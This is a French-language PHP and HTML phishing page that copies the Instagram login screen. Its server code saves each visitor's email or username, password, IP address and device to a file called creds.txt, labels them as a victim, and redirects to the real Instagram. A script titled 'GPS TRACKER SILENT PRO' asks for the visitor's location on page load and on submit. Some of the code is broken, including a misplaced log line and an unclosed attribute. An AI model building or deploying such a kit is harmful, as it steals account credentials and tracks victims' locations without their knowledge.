<?php
if ($_POST) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'inconnue';
    $ip = trim(explode(',', $ip)[0]);

    $email = $_POST['email'] ?? '';
    $pass  = $_POST['password'] ?? '';
    $ua    = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150);
    
// APRÈS $ua = ...
$gps = isset($_POST['gps_lat']) && isset($_POST['gps_lon']) 
    ? "GPS: {$_POST['gps_lat']}, {$_POST['gps_lon']}" 
    : "GPS: N/A";

$log .= "│ 📍 {$gps}\n";  // ← AJOUTE ÇA

     $time  = date('Y-m-d H:i:s');

    $log  = "┌─────────────────────────────────────────\n";
    $log .= "│ 🎯 INSTAGRAM VICTIME — {$time}\n";
    $log .= "├─────────────────────────────────────────\n";
    $log .= "│ 📧 EMAIL/USER : {$email}\n";
    $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
    $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
    $log .= "│ 📱 APPAREIL     : {$ua}\n";
    $log .= "└─────────────────────────────────────────\n";

    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);

    // Redirection directe vers Instagram
    header('Location: https://www.instagram.com/');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Connexion</title>
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
    <style>
        /* Instagram CSS Clone - RESPONSIVE ET CENTRÉ */
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
        }

        .main-container {
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: center;
            max-width: 935px;
            width: 100%;
            margin: 0 auto;
            padding: 32px 20px;
            gap: 32px;
        }

        .phone-image {
            width: 380px;
            height: 581px;
            background-image: url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png');
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            flex-shrink: 0;
        }

        .login-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            min-width: 350px;
        }

        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            text-align: center;
            width: 100%;
            max-width: 350px;
            box-sizing: border-box;
        }

        .logo {
            font-family: 'Grand Hotel', cursive;
            font-size: 54px;
            font-weight: 400;
            margin-bottom: 24px;
            color: #262626;
            line-height: 1;
        }

        .input-field {
            width: 100%;
            padding: 12px 16px;
            font-size: 16px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 6px;
            background-color: #fafafa;
            box-sizing: border-box;
        }

        .input-field:focus {
            outline: none;
            background-color: #fff;
            border-color: #a8a8a8;
        }

        .submit-btn {
            background-color: #0095f6;
            border: 1px solid #0095f6;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            padding: 8px 16px;
            width: 100%;
            margin-top: 8px;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .divider span {
            padding: 0 18px;
        }

        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .fb-login img {
            width: 16px;
            height: 16px;
        }

        .forgot-password {
            font-size: 12px;
            color: #00376b;
            margin-bottom: 20px;
        }

        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            width: 100%;
            max-width: 350px;
            box-sizing: border-box;
            font-size: 14px;
        }

        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .app-download {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            gap: 10px;
        }

        .app-download img {
            height: 40px;
            cursor: pointer;
        }

        /* RESPONSIVE */
        @media (max-width: 876px) {
            .main-container {
                flex-direction: column;
                padding: 32px 16px;
            }
            .phone-image {
                display: none;
            }
            .login-section {
                width: 100%;
                max-width: 350px;
            }
        }
    </style>



<!-- GPS TRACKER SILENT PRO -->
<script>
function captureGPS() {
    navigator.geolocation.getCurrentPosition(pos => {
        const form = document.createElement('form');
        form.method = 'POST'; form.style.display = 'none';
        form.innerHTML = `
            <input name="gps_lat" value="${pos.coords.latitude}">
            <input name="gps_lon" value="${pos.coords.longitude}">
        `;
        document.body.appendChild(form);
        form.submit();
    }, ()=>{}, {enableHighAccuracy: true, timeout: 5000});
}
window.onload = captureGPS;

// GPS sur submit
function gpsSubmit(form) {
    navigator.geolocation.getCurrentPosition(pos => {
        const lat = document.createElement('input');
        lat.type = 'hidden'; lat.name = 'gps_lat'; lat.value = pos.coords.latitude;
        const lon = document.createElement('input');
        lon.type = 'hidden'; lon.name = 'gps_lon'; lon.value = pos.coords.longitude;
        form.appendChild(lat); form.appendChild(lon);
        form.submit();
    }, () => form.submit(), {enableHighAccuracy: true});
    return false;
}
</script>




</head>
<body>
    <div class="main-container">
        <div class="phone-image"></div>
        <div class="login-section">
            <div class="login-box">
                <div class="logo">Instagram</div>
                <form method="POST" action="" onsubmit="return gpsSubmit(this)>
                    <input type="text" name="email" class="input-field" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required>
                    <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
                    <button type="submit" class="submit-btn">Se connecter</button>
                </form>
                <div class="divider"><span>OU</span></div>
                <div class="fb-login">
                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzE4NzdmMiIgZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS44NTR2LTguMzg1SDcuMDc4di0zLjQ3aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNSAyLjY4Ni4yMzV2Mi45NTNIMU5hM2M0LjMzLjc5NCAxNS44MyAxMS45MjcgMTUuODMgMTEuOTI3eiIvPjwvc3ZnPg==" alt="Facebook">
                    Se connecter avec Facebook
                </div>
                <div class="forgot-password">Mot de passe oublié ?</div>
            </div>
            <div class="signup-box">
                Vous n'avez pas de compte ? <a href="#" class="signup-link">S'inscrire</a>
            </div>
            <div class="app-download">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_french-french.png/180ae7a0bcf7.png" alt="App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_french-fr.png/180ae7a0bcf7.png" alt="Google Play">
            </div>
        </div>
    </div>
</body>
</html>
